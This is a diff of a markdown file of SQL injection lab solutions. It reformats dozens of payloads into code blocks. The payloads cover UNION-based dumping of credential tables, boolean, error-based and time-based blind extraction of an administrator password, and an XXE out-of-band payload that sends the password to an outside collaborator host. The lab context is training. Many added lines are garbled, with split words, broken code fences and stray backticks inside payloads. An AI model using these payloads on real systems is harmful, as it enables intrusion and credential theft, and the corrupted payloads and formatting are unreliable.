@@ -31,7 +31,12 @@ to display one or more unreleased products.
 ##### Solution
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Modify the `category` parameter, giving it the value `'+OR+1=1--`
+2. Modify the `category` parameter, giving it the value 
+
+   ```sql
+   '+OR+1=1--
+   ```
+
 3. Submit the request, and verify that the response now contains one or more unreleased products.
 
 ### Lab: SQL injection vulnerability allowing login bypass
@@ -71,11 +76,15 @@ injection/cheat-sheet).
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
-`'+UNION+SELECT+'abc','def'+FROM+dual--`
+```sql
+'+UNION+SELECT+'abc','def'+FROM+dual--
+```
 
 3. Use the following payload to display the database version:
 
-`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
+```sql
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+```
 
 ### Lab: SQL injection attack, querying the database type and version on MySQL
 
@@ -97,11 +106,15 @@ security/sql-injection/cheat-sheet).
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
-`'+UNION+SELECT+'abc','def'#`
+```sql
+'+UNION+SELECT+'abc','def'#
+```
 
 3. Use the following payload to display the database version:
 
-`'+UNION+SELECT+@@version,+NULL#`
+```sql
+'+UNION+SELECT+@@version,+NULL#
+```
 
 ### Lab: SQL injection attack, listing the database contents on non-Oracle
 
@@ -128,21 +141,29 @@ security/sql-injection/cheat-sheet).
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
-`'+UNION+SELECT+'abc','def'--`
+```sql
+'+UNION+SELECT+'abc','def'--
+```
 
 3. Use the following payload to retrieve the list of tables in the database:
 
-`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
+```sql
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+```
 
 4. Find the name of the table containing user credentials.
 5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
 
-`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
+```sql
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+```
 
 6. Find the names of the columns containing usernames and passwords.
 7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
 
-`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
+```sql
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+```
 
 8. Find the password for the `administrator` user, and use it to log in.
 
@@ -170,29 +191,36 @@ still need to include the `FROM` keyword followed by a valid table name.
 There is a built-in table on Oracle called `dual` which you can use for this
 purpose. For example: `UNION SELECT 'abc' FROM dual`
 
-For more information, see our [SQL injection cheat sheet](/web-security/sql-
-injection/cheat-sheet).
+For more information, see our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
 
 ##### Solution
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
-`'+UNION+SELECT+'abc','def'+FROM+dual--`
+   ```sql
+   '+UNION+SELECT+'abc','def'+FROM+dual--
+   ```
 
 3. Use the following payload to retrieve the list of tables in the database:
 
-`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
+   ```sql
+   '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+   ```
 
 4. Find the name of the table containing user credentials.
 5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
 
-`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
+   ```sql
+   '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+   ```
 
 6. Find the names of the columns containing usernames and passwords.
 7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
 
-`'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
+   ```sql
+   '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+   ```
 
 8. Find the password for the `administrator` user, and use it to log in.
 
@@ -219,11 +247,15 @@ you determine which columns are compatible with string data.
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:
 
-`'+UNION+SELECT+NULL,NULL,NULL--`
+   ```sql
+   '+UNION+SELECT+NULL,NULL,NULL--
+   ```
 
 3. Try replacing each null with the random value provided by the lab, for example:
 
-`'+UNION+SELECT+'abcdef',NULL,NULL--`
+   ```sql
+   '+UNION+SELECT+'abcdef',NULL,NULL--
+   ```
 
 4. If an error occurs, move on to the next null and try that instead.
 
@@ -271,11 +303,15 @@ security/sql-injection/cheat-sheet).
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
 
-`'+UNION+SELECT+NULL,'abc'--`
+   ```sql
+   '+UNION+SELECT+NULL,'abc'--
+   ```
 
 3. Use the following payload to retrieve the contents of the `users` table:
 
-`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
+   ```sql
+   '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+   ```
 
 4. Verify that the application's response contains usernames and passwords.
 
@@ -283,21 +319,27 @@ security/sql-injection/cheat-sheet).
 
 6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
 
-`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
-LENGTH(password)>1)='a`
+   ```bash
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
+   LENGTH(password)>1)='a
+   ```
 
 This condition should be true, confirming that the password is greater than 1
 character in length.
 
 7. Send a series of follow-up values to test different password lengths. Send:
 
-`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
-LENGTH(password)>2)='a`
+   ```bash
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
+   LENGTH(password)>2)='a
+   ```
 
 Then send:
 
-`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
-LENGTH(password)>3)='a`
+   ```bash
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND
+   LENGTH(password)>3)='a
+   ```
 
 And so on. You can do this manually using [Burp
 Repeater](/burp/documentation/desktop/tools/repeater), since the length is
@@ -308,8 +350,10 @@ password, which is in fact 20 characters long.
 8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 9. In Burp Intruder, change the value of the cookie to:
 
-`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE
-username='administrator')='a`
+   ```bash
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE
+   username='administrator')='a
+   ```
 
 This uses the `SUBSTRING()` function to extract a single character from the
 password, and test it against a specific value. Our attack will cycle through
@@ -317,8 +361,10 @@ each position and possible value, testing each one in turn.
 
 10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
 
-`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE
-username='administrator')='§a§`
+   ```bash
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE
+   username='administrator')='§a§
+   ```
 
 11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
 12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression `Welcome back`. To do this, click on the **Settings** tab to open the **Settings** side panel. In the **Grep - Match** section, clear existing entries in the list, then add the value `Welcome back`.
@@ -326,8 +372,10 @@ username='administrator')='§a§`
 14. Review the attack results to find the value of the character at the first position. You should see a column in the results called `Welcome back`. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
 15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
 
-`TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE
-username='administrator')='a`
+   ```bash
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE
+   username='administrator')='a
+   ```
 
 16. Launch the modified attack, review the results, and note the character at the second offset.
 17. Continue this process testing offset 3, 4, and so on, until you have the whole password.
@@ -367,37 +415,44 @@ cheat sheet](/web-security/sql-injection/cheat-sheet).
 ##### Solution
 
 1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
-2. Modify the `TrackingId` cookie, appending a single quotation mark to it:
-
-`TrackingId=xyz'`
+2. Modify the `TrackingId` cookie, appending a single quotation mark to it: `TrackingId=xyz'`
 
 Verify that an error message is received.
 
 3. Now change it to two quotation marks: `TrackingId=xyz''` Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
-4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
 
-`TrackingId=xyz'||(SELECT '')||'`
+4. You now need to confirm that the server is inter
+preting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
+
+   ```bash
+   TrackingId=xyz'||(SELECT '')||'`
+   ```
 
 In this case, notice that the query still appears to be invalid. This may be
 due to the database type - try specifying a predictable table name in the
 query:
 
-`TrackingId=xyz'||(SELECT '' FROM dual)||'`
-
+   ```bash
+   TrackingId=xyz'||(SELECT '' FROM dual)||'`
+   ```
 As you no longer receive an error, this indicates that the target is probably
 using an Oracle database, which requires all `SELECT` statements to explicitly
 specify a table name.
 
 5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
 
-`TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
+   ```bash
+   TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
+   ```
 
 This time, an error is returned. This behavior strongly suggests that your
 injection is being processed as a SQL query by the back-end.
 
 6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the `users` table exists, send the following query:
 
-`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+   ```bash
+   TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+   ```
 
 As this query does not return an error, you can infer that this table does
 exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent
@@ -406,15 +461,19 @@ concatenation.
 
 7. You can also exploit this behavior to test conditions. First, submit the following query:
 
-`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM
-dual)||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM
+   dual)||'
+   ```
 
 Verify that an error message is received.
 
 8. Now change it to:
 
-`TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM
-dual)||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM
+   dual)||'
+   ```
 
 Verify that the error disappears. This demonstrates that you can trigger an
 error conditionally on the truth of a specific condition. The `CASE` statement
@@ -426,29 +485,37 @@ the condition is `true`.
 
 9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:
 
-`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM
-users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM
+   users WHERE username='administrator')||'
+   ```
 
 Verify that the condition is true (the error is received), confirming that
 there is a user called `administrator`.
 
 10. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
 
-`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE
-'' END FROM users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE
+   '' END FROM users WHERE username='administrator')||'
+   ```
 
 This condition should be true, confirming that the password is greater than 1
 character in length.
 
 11. Send a series of follow-up values to test different password lengths. Send:
 
-`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE
-'' END FROM users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE
+   '' END FROM users WHERE username='administrator')||'
+   ```
 
 Then send:
 
-`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE
-'' END FROM users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE
+   '' END FROM users WHERE username='administrator')||'
+   ```
 
 And so on. You can do this manually using [Burp
 Repeater](/burp/documentation/desktop/tools/repeater), since the length is
@@ -459,8 +526,10 @@ disappears), you have determined the length of the password, which is in fact
 12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 13. Go to Burp Intruder and change the value of the cookie to:
 
-`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0)
-ELSE '' END FROM users WHERE username='administrator')||'`
+```bash
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0)
+ELSE '' END FROM users WHERE username='administrator')||'
+```
 
 This uses the `SUBSTR()` function to extract a single character from the
 password, and test it against a specific value. Our attack will cycle through
@@ -468,16 +537,22 @@ each position and possible value, testing each one in turn.
 
 14. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
 
-`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN
-TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN
+   TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator
+   '``)||'
+   ```
 
 15. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
 16. Launch the attack by clicking the " Start attack" button.
 17. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
 18. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
 
-`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN
-TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+   ```bash
+   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN
+   TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator
+   '``)||'
+   ```
 
 19. Launch the modified attack, review the results, and note the character at the second offset.
 20. Continue this process testing offset 3, 4, and so on, until you have the whole password.
@@ -496,41 +571,59 @@ for the `administrator` user, then log in to their account.
 ##### Solution
 
 1. Using Burp's built-in browser, explore the lab functionality.
-2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
-3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
+2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a ```bash
+TrackingId` cookie.
+3. In Repeater, ap
+p``end a single quote to the value of your ```bash
+TrackingId` cookie and send the request.
 
-`TrackingId=ogAZZfxtOKUELbuJ'`
+   ```bash
+   TrackingId=ogAZZfxtOKUELbuJ'`
+   ```
 
 4. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
 5. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
 
-`TrackingId=ogAZZfxtOKUELbuJ'--`
+   ```bash
+   TrackingId=ogAZZfxtOKUELbuJ'--`
+   ```
 
 6. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
 7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
 
-`TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
+```bash
+TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
+```
 
 8. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
 9. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
 
-`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
+```bash
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
+```
 
 10. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
 11. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
 
-`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS
-int)--`
+```bash
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS
+int)--
+```
 
 12. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
-13. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
+13. Delete the original value of the ```bash
+TrackingId` cookie to free up some additional characters. Resend the request.
 
-`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
+```bash
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
+```
 
 14. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
 15. Modify the query to return only one row:
 
-`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+```bash
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+```
 
 16. Send the request. Observe that the error message now leaks the first username from the `users` table:
 
@@ -538,7 +631,9 @@ int)--`
 
 17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
 
-`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+```bash
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+```
 
 18. Log in as `administrator` using the stolen password to solve the lab.
 
@@ -563,10 +658,15 @@ security/sql-injection/cheat-sheet).
 
 ##### Solution
 
-1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
-2. Modify the `TrackingId` cookie, changing it to:
+1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ```bash
+TrackingId` cookie.
+2. Modify the ```b
+a``sh
+TrackingId` cookie, changing it to:
 
-`TrackingId=x'||pg_sleep(10)--`
+```bash
+TrackingId=x'||pg_sleep(10)--`
+```
 
 3. Submit the request and observe that the application takes 10 seconds to respond.
 
@@ -594,41 +694,56 @@ security/sql-injection/cheat-sheet).
 
 ##### Solution
 
-1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
-2. Modify the `TrackingId` cookie, changing it to:
+1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ```bash
+TrackingId` cookie.
+2. Modify the ```b
+a``sh
+TrackingId` cookie, changing it to:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
+```
 
 Verify that the application takes 10 seconds to respond.
 
 3. Now change it to:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
+```
 
 Verify that the application responds immediately with no time delay. This
 demonstrates how you can test a single boolean condition and infer the result.
 
 4. Now change it to:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```
 
 Verify that the condition is true, confirming that there is a user called
 `administrator`.
 
 5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```
 
 This condition should be true, confirming that the password is greater than 1
 character in length.
 
 6. Send a series of follow-up values to test different password lengths. Send:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```
 
 Then send:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```bash
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+```
 
 And so on. You can do this manually using [Burp
 Repeater](/burp/documentation/desktop/tools/repeater), since the length is
@@ -639,7 +754,9 @@ the length of the password, which is in fact 20 characters long.
 7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 8. In Burp Intruder, change the value of the cookie to:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```bash
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```
 
 This uses the `SUBSTRING()` function to extract a single character from the
 password, and test it against a specific value. Our attack will cycle through
@@ -647,7 +764,9 @@ each position and possible value, testing each one in turn.
 
 9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```bash
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```
 
 10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
 11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
@@ -655,7 +774,9 @@ each position and possible value, testing each one in turn.
 13. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
 14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:
 
-`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```bash
+   TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+   ```
 
 15. Launch the modified attack, review the results, and note the character at the second offset.
 16. Continue this process testing offset 3, 4, and so on, until you have the whole password.
@@ -687,11 +808,17 @@ security/sql-injection/cheat-sheet).
 
 ##### Solution
 
-1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
-2. Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
+1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ```bash
+TrackingId` cookie.
+2. Modify the ```b
+a``sh
+TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
 
-`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-
-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
+   ```bash
+   TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-
+   COLLABORATOR-SUBDOMAIN/">+%25
+   r``emote%3b]>'),'/l')+FROM+dual--`
+   ```
 
 3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
 
@@ -731,14 +858,21 @@ security/sql-injection/cheat-sheet).
 
 ##### Solution
 
-1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the `TrackingId` cookie.
-2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
+1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the ```bash
+TrackingId` cookie.
+2. Modify the ```b
+a``sh
+TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
 
-`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-
-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
+   ```bash
+   TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-
+   COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+   ```
 
